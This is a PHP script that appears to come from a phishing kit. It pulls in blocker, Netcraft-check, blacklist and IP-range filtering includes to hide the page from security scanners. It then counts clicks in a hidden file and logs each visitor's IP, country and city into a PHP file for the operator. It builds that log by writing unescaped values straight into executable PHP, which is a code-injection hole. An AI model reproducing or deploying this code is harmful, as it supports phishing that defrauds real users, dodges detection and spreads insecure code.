<?php
require_once "config.php";
    require "blocker.php";
    require "blocker2.php";
    require "assets/includes/visitor_log.php";
    require "assets/includes/netcraft_check.php";
    require "assets/includes/blacklist_lookup.php";
    require "assets/includes/ip_range_check.php";
    require "result/detect.php";
    $file2 = $_SERVER['DOCUMENT_ROOT'] . "/assets/logs/._click_.txt";
    $isi = @file_get_contents($file2);
    $buka = fopen($file2, "w");
    fwrite($buka, $isi + 1);
	$dt = date("l, F j Y h:i:s A");
    $dt1 = strtotime(date("Y-m-d H:i:s"));
	$msg = "
<?php
".'$start = '.'"'.$dt1.'";
'." ".'$end = '.'strtotime(date("Y-m-d H:i:s"))'.";
".' '." echo '<font color=#00ff08>Visitor</font> > ".$ip.",<font color=#0017ed> ".$nama_negara.", ".$kota.", ".date('Y-m-d')."</font>, <font color=red>';".' echo round(abs($end - $start) / 60,0). " minute ago</font>";?>'."
    ";

    $file=fopen("visitor_log.php","a");
    fwrite($file, $msg);
    fclose($file);
?>
